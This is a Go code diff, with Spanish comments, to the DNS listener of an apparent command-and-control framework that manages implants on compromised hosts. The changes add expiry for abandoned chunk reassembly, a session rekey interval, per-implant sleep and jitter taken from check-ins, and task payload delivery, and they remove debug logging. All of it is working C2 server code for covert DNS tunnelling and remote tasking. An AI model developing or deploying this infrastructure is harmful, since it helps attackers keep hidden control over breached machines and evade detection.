@@ -40,6 +40,9 @@ type DNSListener struct {
 	// Perfil DNS activo (por defecto dns-txt).
 	profile *profiles.DNSProfile
 
+	// Intervalo de rekey para las sesiones nuevas (0 = default).
+	rekeyEvery uint64
+
 	// Par X25519 persistente del server. Se usa para el handshake ECDH
 	// con los implantes DNS. Compartido con el listener HTTPS y con el
 	// builder, para que todos usen la misma clave pública.
@@ -56,8 +59,15 @@ type DNSListener struct {
 	// Total esperado por implant-id.
 	pendingTotal map[string]int
 
+	// Momento en que llegó el primer chunk pendiente de cada implant-id.
+	// Sirve para expirar reensamblados abandonados.
+	pendingSince map[string]time.Time
+
 	// Respuestas listas para entregar en el proximo poll.
 	responses map[string][]string
+
+	// TTL de un reensamblado incompleto antes de descartarlo.
+	chunkTTL time.Duration
 }
 
 // NewDNSListener crea un listener DNS con persistencia de claves de sesion.
@@ -72,6 +82,7 @@ func NewDNSListener(
 	registry *sessions.Registry,
 	bus *events.Bus,
 	serverKeys *crypto.ServerKeyStore,
+	rekeyEvery uint64,
 	log *slog.Logger,
 ) (*DNSListener, error) {
 	if serverKeys == nil {
@@ -99,12 +110,15 @@ func NewDNSListener(
 		serverKeys: serverKeys,
 		serverPriv: serverKeys.PrivateKey(),
 		profile:    profile,
+		rekeyEvery: rekeyEvery,
 		router:     protocol.NewRouter(log),
 		crypto:     crypto.NewSessionCryptoStoreWithRepo(store.SessionKeys),
 
 		pendingChunks: make(map[string]map[int]string),
 		pendingTotal:  make(map[string]int),
+		pendingSince:  make(map[string]time.Time),
 		responses:     make(map[string][]string),
+		chunkTTL:      5 * time.Minute,
 	}
 
 	// Registrar handlers en el router (mismos que HTTPS).
@@ -217,19 +231,35 @@ func (l *DNSListener) processChunk(implantID string, seq, total int, chunk strin
 		return ""
 	}
 
+	// Expirar reensamblados abandonados: si el primer chunk de este
+	// implante lleva más de chunkTTL sin completarse, descartarlo y
+	// empezar de cero. Evita acumular RAM de implantes que envían
+	// chunks parciales y desaparecen.
+	if since, ok := l.pendingSince[implantID]; ok && time.Since(since) > l.chunkTTL {
+		l.log.Warn("dns: reensamblado expirado por TTL",
+			"implant", implantID,
+			"chunks", len(l.pendingChunks[implantID]),
+			"total_esperado", l.pendingTotal[implantID],
+			"ttl", l.chunkTTL.String(),
+		)
+		delete(l.pendingChunks, implantID)
+		delete(l.pendingTotal, implantID)
+		delete(l.pendingSince, implantID)
+	}
+
 	// Acumular chunk.
 	if l.pendingChunks[implantID] == nil {
 		l.pendingChunks[implantID] = make(map[int]string)
+		l.pendingSince[implantID] = time.Now()
 	}
 	l.pendingChunks[implantID][seq] = chunk
 	l.pendingTotal[implantID] = total
 
-	l.log.Info("dns debug: chunk recibido",
+	l.log.Debug("dns: chunk recibido",
 		"implant", implantID,
 		"seq", seq,
 		"total", total,
 		"chunk_len", len(chunk),
-		"chunk_prefix", chunk[:min(20, len(chunk))],
 		"pending_count", len(l.pendingChunks[implantID]),
 	)
 
@@ -248,30 +278,13 @@ func (l *DNSListener) processChunk(implantID string, seq, total int, chunk strin
 	}
 	fullEncoded := sb.String()
 
-	keys := make([]int, 0, len(l.pendingChunks[implantID]))
-	for k := range l.pendingChunks[implantID] {
-		keys = append(keys, k)
-	}
-	l.log.Info("dns debug: reensamblando",
-		"implant", implantID,
-		"full_encoded_len", len(fullEncoded),
-		"full_encoded_prefix", fullEncoded[:min(30, len(fullEncoded))],
-		"keys_presentes", keys,
-	)
-
 	// Limpiar buffers.
 	delete(l.pendingChunks, implantID)
 	delete(l.pendingTotal, implantID)
+	delete(l.pendingSince, implantID)
 
 	// Decodificar segun el perfil.
 	envelopeBytes, err := l.profile.DecodeData(fullEncoded)
-
-	if err == nil {
-		l.log.Info("dns debug: decode ok",
-			"implant", implantID,
-			"decoded_len", len(envelopeBytes),
-		)
-	}
 
 	if err != nil {
 		l.log.Warn("dns: decodificar fallo",
@@ -404,6 +417,8 @@ func (l *DNSListener) handleCheckinEnvelope(ctx context.Context, env *protocol.E
 		PID        int    `json:"pid"`
 		Process    string `json:"process"`
 		InternalIP string `json:"internal_ip"`
+		Sleep      int    `json:"sleep"`
+		Jitter     int    `json:"jitter"`
 		PublicKey  string `json:"public_key"`
 	}
 	if err := json.Unmarshal(env.Payload, &req); err != nil {
@@ -411,6 +426,14 @@ func (l *DNSListener) handleCheckinEnvelope(ctx context.Context, env *protocol.E
 	}
 	if req.SessionKey == "" || req.PublicKey == "" {
 		return nil, fmt.Errorf("dns checkin: session_key y public_key requeridos")
+	}
+	sleep := req.Sleep
+	if sleep <= 0 {
+		sleep = l.profile.Sleep
+	}
+	jitter := req.Jitter
+	if jitter < 0 {
+		jitter = 0
 	}
 
 	pubBytes, err := base64.StdEncoding.DecodeString(req.PublicKey)
@@ -442,8 +465,8 @@ func (l *DNSListener) handleCheckinEnvelope(ctx context.Context, env *protocol.E
 			ListenerID:    l.ID,
 			PublicKey:     pubBytes,
 			Status:        models.ImplantAlive,
-			SleepInterval: l.profile.Sleep,
-			Jitter:        l.profile.Jitter,
+			SleepInterval: sleep,
+			Jitter:        jitter,
 			FirstSeen:     now,
 			LastCheckIn:   now,
 			Metadata:      map[string]any{"transport": "dns"},
@@ -474,7 +497,7 @@ func (l *DNSListener) handleCheckinEnvelope(ctx context.Context, env *protocol.E
 
 	l.registry.Register(implant.ID)
 
-	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey)
+	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey, l.rekeyEvery)
 	if err != nil {
 		return nil, fmt.Errorf("dns checkin: derivar session crypto: %w", err)
 	}
@@ -538,6 +561,7 @@ func (l *DNSListener) handleTaskPullEnvelope(ctx context.Context, env *protocol.
 			ID:      t.ID.String(),
 			Command: t.Command,
 			Args:    t.Args,
+			Payload: t.Payload,
 		})
 	}
 	tasksJSON, err := json.Marshal(wire)
@@ -730,4 +754,28 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+// ExpirePendingRekeys purga los rekeys pendientes expirados del store
+// criptográfico del listener. Lo llama el janitor del server.
+func (l *DNSListener) ExpirePendingRekeys() []uuid.UUID {
+	return l.crypto.ExpirePendingRekeys()
+}
+
+// ExpireStaleChunks purga los reensamblados DNS que superaron su TTL.
+// Los chunks TTL ya se purgan al vuelo en processChunk, pero este método
+// permite limpiar implantes que nunca vuelven a enviar otro chunk.
+func (l *DNSListener) ExpireStaleChunks() []string {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	var expired []string
+	for id, since := range l.pendingSince {
+		if time.Since(since) > l.chunkTTL {
+			delete(l.pendingChunks, id)
+			delete(l.pendingTotal, id)
+			delete(l.pendingSince, id)
+			expired = append(expired, id)
+		}
+	}
+	return expired
 }
